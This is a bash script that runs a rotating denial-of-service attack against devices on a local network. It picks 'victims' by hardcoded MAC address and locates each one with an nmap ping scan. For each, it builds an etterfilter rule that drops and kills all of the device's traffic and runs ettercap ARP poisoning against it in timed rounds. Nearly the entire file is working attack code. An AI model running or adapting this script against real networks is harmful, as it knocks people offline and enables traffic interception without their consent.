#!/bin/bash

#   for each MAC address
#   isolate them in a round
#   after fping( about 30 seconds )
#   if a victim is down
#     jump to next victim
#   2014.07.07

LAN="115.155.46.0/25"

ROUNDTIME=44

MAC=("" "b8:70:f4:4a:f4:ee" "e8:9a:8f:2f:e3:ef" "14:da:e9:61:0c:7e" "54:04:a6:ae:00:ec" "10:78:d2:6a:a0:28" "84:8f:69:d2:cb:4a" "f0:de:f1:5c:0c:4e" "b8:88:e3:7b:80:ce" "14:fe:b5:c4:1e:74" "ac:22:0b:d7:59:5c" "04:7d:7b:fb:84:19" "04:7d:7b:2d:13:45")

counter()
{
    for i in $( seq $1 -1 1 )
    do
        echo "[+] victim $2 , $i second(s) left"
        sleep 1
    done
}

#  in case of being isolated from switch
arp -s 115.155.46.126 00:1A:A9:15:77:09


while :
do
for i in $( seq 1 1 12 )
do

#if [ $i == 1 ] ; then continue ; fi
#if [ $i == 2 ] ; then continue ; fi
#if [ $i == 3 ] ; then continue ; fi
#if [ $i == 4 ] ; then continue ; fi

if [ $i == 5 ] ; then continue ; fi
#if [ $i == 6 ] ; then continue ; fi
#if [ $i == 7 ] ; then continue ; fi
#if [ $i == 8 ] ; then continue ; fi

#if [ $i == 9 ] ; then continue ; fi
#if [ $i == 10 ] ; then continue ; fi
if [ $i == 11 ] ; then continue ; fi
if [ $i == 12 ] ; then continue ; fi

VICTIM_MAC=${MAC[$i]}
echo "[+] Using mac address to find IP address for victim $i ..."
#using fping to find
#fping -g $LAN > /dev/null 2>&1
#fping -g $LAN
#VICTIM_IP=`
#  arp -a |
#  grep -i "$VICTIM_MAC" |
#  awk -F " " '{print $2}' |
#  sed 's/.*(//g;s/).*//g'
#`
#VICTIM_IP=`
#  arp -a |
#  grep -i "$VICTIM_MAC" |
#  awk -F " " '{print $2}' |
#  sed 's/.*(//g;s/).*//g'
#`
#using nmap to find
VICTIM_IP=`
  nmap -sn $LAN |
  grep -iB 2 $VICTIM_MAC |
  head -1 |
  awk -F " " '{print $NF}'
`

if [ -z "$VICTIM_IP" ] ; then
    echo "[-] **************"
    echo "[-] victim $i is down"
    echo -n "[+] "
    date
    echo "[-] **************"
    sleep 1
    continue
fi
echo "[+] ************"
echo "[+] victim $i is up"
echo -n "[+] "
date
echo "[+] ************"
sleep 2


VICTIM_IP_END=`echo $VICTIM_IP | cut -d"." -f4`
FILENAME_EF="DoS_$VICTIM_IP_END.ef"
FILENAME_EFT="DoS_$VICTIM_IP_END.eft"

if [ ! -e "$FILENAME_EF" ] ; then
    echo "[-] $FILENAME_EF does not exist."
    sleep 2
    echo "if ( ip.src == '$VICTIM_IP' || ip.dst == '$VICTIM_IP' )" > "$FILENAME_EFT"
    echo "{" >> "$FILENAME_EFT"
    echo "    drop() ;" >> "$FILENAME_EFT"
    echo "    kill() ;" >> "$FILENAME_EFT"
#    echo "    msg( \"[+] Packet $VICTIM_IP_END killed\\n\" ) ; " >> "$FILENAME_EFT"
    echo "    msg( \"[+] Packet $VICTIM_IP_END killed\" ) ; " >> "$FILENAME_EFT"
    echo "}" >> "$FILENAME_EFT"
    etterfilter "$FILENAME_EFT" -o "$FILENAME_EF"
else
    echo "[+] $FILENAME_EF does exist."
    sleep 2
fi

ettercap -T -q -F $FILENAME_EF -M ARP /$VICTIM_IP/ // &
counter $ROUNDTIME $i
killall ettercap


done
#end of for
done
#end of while
